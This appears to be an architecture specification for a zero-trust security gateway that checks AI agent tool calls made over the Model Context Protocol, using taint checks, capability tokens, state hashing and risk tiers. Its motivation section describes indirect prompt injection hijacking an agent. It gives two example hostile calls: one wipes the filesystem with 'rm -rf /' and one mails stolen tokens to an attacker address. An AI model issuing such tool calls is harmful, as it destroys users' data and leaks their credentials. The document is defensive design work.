# VEIL Zero-Trust Model Context Protocol (MCP) Tool Security Gateway

**Specification Version**: 2.4.0  
**Status**: Authoritative Architecture Specification  
**Classification**: Public Research Standard  
**Subject**: Zero-Trust mediation, taint checking, and capability binding for Agent-Tool interactions via MCP.

---

## 1. Motivation: The Tool Calling Vulnerability

The **Model Context Protocol (MCP)** standardizes how autonomous LLM agents discover and invoke external tools (file system access, database queries, terminal execution, API integrations, web scrapers).

However, current MCP deployments exhibit a critical security flaw:
$$\textbf{Agent Model Intent} \equiv \textbf{Execution Authority}$$

If an agent is hijacked via Indirect Prompt Injection (IPI) from an untrusted web page or document, it can immediately issue a valid MCP tool call (e.g., `execute_command("rm -rf /")` or `send_email("attacker@evil.com", stolen_tokens)`). The MCP server has no mechanism to determine:
1. Did this request originate from verified user intent, or from untrusted web taint?
2. Does the agent possess an unexpired, single-use Capability Token for this specific side-effect primitive?
3. Is the file system or database state matching what was verified before invocation?

---

## 2. Architectural Model

The **VEIL MCP Tool Security Gateway** operates as an in-line cryptographic and policy proxy between the Agent Client and the target MCP Server:

```
                    ┌────────────────────────────┐
                    │   Autonomous Agent / LLM   │
                    └─────────────┬──────────────┘
                                  │ tools/call (JSON-RPC)
                                  ▼
           ┌──────────────────────────────────────────────┐
           │      VEIL ZERO-TRUST MCP GATEWAY (Proxy)     │
           │                                              │
           │ 1. Taint Analysis (TaintEngine)              │
           │    Reject tool call if arguments are tainted │
           │ 2. Capability Binding (CapabilityManager)    │
           │    Verify unexpired single-use token         │
           │ 3. Policy Decision (PolicyCompiler / VPL)    │
           │    Evaluate tool permissions & constraints   │
           │ 4. Pre-State Commitment (StateHasher)        │
           │    Verify target file / DB state integrity   │
           └──────┬────────────────────────────────┬──────┘
                  │                                │
        [POLICY DENY / TAINTED]          [VERIFIED / AUTHORIZED]
                  │                                │
                  ▼                                ▼
         ┌─────────────────┐            ┌──────────────────────┐
         │ Return E_BLOCKED│            │ Forward to Real Tool │
         │  Audit Receipt  │            │  (File / DB / Shell) │
         └─────────────────┘            └──────────┬───────────┘
                                                   │
                                                   ▼
                                        ┌──────────────────────┐
                                        │ Post-Execution Proof │
                                        │  VEIL_TOOL_RECEIPT   │
                                        └──────────────────────┘
```

---

## 3. Tool Mediation Pipeline

When an agent issues a `tools/call` invocation:
```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "write_file",
    "arguments": {
      "path": "/var/data/config.json",
      "content": "{ \"key\": \"val\" }"
    }
  }
}
```

The VEIL Gateway executes five sequential verification stages:

### Stage 1: Protocol & Schema Validation
- Validates the tool invocation conforms to the registered tool signature and VEIL IR v2.
- Ensures all mandatory fields are present; discards any unrecognized properties.

### Stage 2: Deep Provenance & Taint Verification
- Checks the taint metadata associated with all argument values.
- **Law of Tool Sanitization**:
  $$\text{Taint}(\text{args}) \cap \{\text{TAINT\_UNTRUSTED\_DOM}, \text{TAINT\_INDIRECT\_PROMPT}\} \neq \emptyset \implies \text{BLOCK}$$
- Untrusted web content cannot supply paths, commands, or secrets to sensitive MCP tools.

### Stage 3: Capability Token Authorization
- Verifies that the agent attached a valid, unconsumed `veil_capability_token`.
- Asserts:
  $$\text{Token}.\text{actionType} == \text{TOOL\_CALL} \land \text{Token}.\text{targetTool} == \text{params}.\text{name}$$
  $$\text{Token}.\text{expiresAt} > \text{now}() \land \text{Token}.\text{nonce} \notin \text{ConsumedNonces}$$

### Stage 4: Pre-State Commitment Binding (TOCTOU Defense)
- For stateful tools (`write_file`, `sql_query`, `update_record`), VEIL computes:
  $$H_{\text{pre}} = \text{SHA-256}(\text{TargetResourceState})$$
- If $H_{\text{pre}} \neq \text{Token}.\text{preStateHash}$, execution fails closed with `ERR_STATE_DESYNCHRONIZATION`.

### Stage 5: Execution Mediation & Action Receipt Generation
- The gateway invokes the downstream tool over isolated IPC or loopback socket.
- Captures output and exit status.
- Issues a non-repudiable `VEIL_TOOL_RECEIPT` into the cryptographic security ledger:
  $$\text{ReceiptHash} = \text{SHA-256}(\text{ToolName} \mathbin{\Vert} \text{ArgsDigest} \mathbin{\Vert} H_{\text{pre}} \mathbin{\Vert} H_{\text{post}})$$

---

## 4. MCP Risk Tier Classification

VEIL categorizes MCP tools into four distinct security tiers:

| Tier | Tool Archetypes | Default Policy | Required Authority |
| :---: | :--- | :---: | :--- |
| **Tier 0** | `read_file`, `search_docs`, `list_directory` | **ALLOW** | Basic read-only capability |
| **Tier 1** | `create_scratch_file`, `format_data`, `render_chart` | **ALLOW** | Sandboxed workspace capability |
| **Tier 2** | `write_production_file`, `git_commit`, `http_post` | **CONFIRM** | Explicit user session approval |
| **Tier 3** | `run_shell_command`, `drop_database`, `wire_transfer` | **STRICT_BLOCK** | Multi-factor hardware / Out-of-band authorization |

---

## 5. Formal Invariant Guarantees

- **MCP-I1 (Zero-Bypass Gateway)**: No tool can execute outside the VEIL gateway mediation path.
- **MCP-I2 (Taint Boundary)**: Untrusted external inputs cannot dictate parameters for Tier 2 or Tier 3 tools.
- **MCP-I3 (Cryptographic Nonce Ephemerality)**: Every tool invocation consumes exactly one capability nonce. Replay attempts abort immediately.
- **MCP-I4 (Post-Execution Auditability)**: Every tool outcome produces an independently verifiable action receipt.
